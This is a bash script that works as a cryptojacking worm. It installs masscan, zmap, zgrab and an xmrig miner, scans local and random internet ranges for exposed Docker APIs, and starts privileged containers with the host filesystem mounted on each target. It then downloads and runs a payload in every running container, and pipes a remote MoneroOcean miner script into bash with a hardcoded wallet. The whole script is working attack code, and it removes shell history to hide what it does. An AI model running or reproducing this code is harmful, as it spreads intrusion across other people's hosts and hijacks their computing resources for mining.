#!/bin/bash
unset HISTFILE
export LC_ALL=C
export PATH=$PATH:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin:/usr/games:/usr/local/games

# Variables
RATESCAN="50000"
SETUP_SLEEP="1"

function INIT_MAIN(){
    SETUP_SYSTEM
    SETUP_BASICS
    SETUP_JQ
    SETUP_ZMAP
    SETUP_ZGRAB
    /usr/local/bin/setup_xmrig.sh
    # Assuming SETUP_MSCAN is needed
    SETUP_MSCAN
}

function SETUP_SYSTEM(){
    apk update || { echo "APK update failed"; exit 1; }
    apk add --no-cache --repository http://dl-cdn.alpinelinux.org/alpine/edge/testing hwloc-dev || { echo "Failed to install hwloc-dev"; exit 1; }
}

function SETUP_BASICS(){
    apk update
    apk add bash curl wget vim docker make upx
    service docker start || { echo "Failed to start Docker"; exit 1; }
}

function SETUP_JQ(){
    apk update
    apk add jq
}

function SETUP_ZMAP(){
    apk update
    apk add zmap
}

function SETUP_ZGRAB(){
    apk update
    apk add git go gcc make musl-dev libpcap-dev linux-headers
    mkdir -p /root/go/src/github.com/zmap
    go get github.com/zmap/zgrab
    cd /root/go/src/github.com/zmap/zgrab || { echo "Failed to change directory"; exit 1; }
    go build || { echo "Go build failed"; exit 1; }
    cp ./zgrab /usr/bin/zgrab || { echo "Failed to copy zgrab"; exit 1; }
    chmod +x /usr/bin/zgrab
}

function SETUP_MSCAN(){
    apk update
    apk add git gcc make musl-dev libpcap-dev linux-headers
    git clone https://github.com/robertdavidgraham/masscan /opt/masscan/
    cd /opt/masscan/ || { echo "Failed to change directory"; exit 1; }
    make || { echo "Masscan build failed"; exit 1; }
    make install || { echo "Failed to install masscan"; exit 1; }
}

function INFECT_ALL_CONTAINERS(){
    docker ps | awk '{print $1}' | grep -v grep | grep -v CONTAINER > /tmp/.dc
    for i in $(cat /tmp/.dc); do
        docker exec --privileged -d "$i" sh -c "apk update; apk add wget curl; mkdir -p /var/tmp/; wget --no-check-certificate $UPSPINTEST -O /var/tmp/sbin; /var/tmp/sbin || curl -sLk $UPSPINTEST -o /var/tmp/sbin; chmod +x /var/tmp/sbin; /var/tmp/sbin"
    done
    export HOME=/root
    nohup $(curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 4AYe7ZbZEAMezv8jVqnagtWz24nA8dkcPaqHa8p8MLpqZvcWJSk7umPNhDuoXM2KRXfoCB7N2w2ZTLmTPj5GgoTvBipk1s9) &
}

function GETLOCALRANGES(){
    ip route show | awk '{print $1}' | grep "/" > /tmp/.lr
}

function AUTOLANDOCKERPWN(){
    TARGETRANGE=$1
    TARGETPORT=$2
    SCANRATE=$3
    rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6; echo '')
    eval "$rndstr"="'$(masscan $TARGETRANGE -p$TARGETPORT --rate=$SCANRATE | awk '{print $6}' | zgrab --senders 200 --port $TARGETPORT --http='/v1.16/version' --output-file=- 2>/dev/null | grep -E 'ApiVersion|client version 1.16' | jq -r .ip)'"

    for TARGETIP in ${!rndstr}; do
        echo "$TARGETIP:$TARGETPORT"
        timeout -s SIGKILL 240s docker -H tcp://$TARGETIP:$TARGETPORT run -d --privileged --network host -v /:/host nmlmweb3/alpine_upspin:latest
    done
}

function LANDOCKERPWN(){
    GETLOCALRANGES
    while read -r TargetRange; do
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
    done < /tmp/.lr
    rm -f /tmp/.lr
}

function RANDOMDOCKERPWN(){
    for (( ; ; )); do
        TargetRange="$[RANDOM%255+1].0.0.0/8"
        echo "scanning $TargetRange"
        AUTOLANDOCKERPWN "$TargetRange" 2375 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2376 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 2377 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4243 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 4244 "$RATESCAN"
        AUTOLANDOCKERPWN "$TargetRange" 5555 "$RATESCAN"
        sleep 1
    done
}

INIT_MAIN
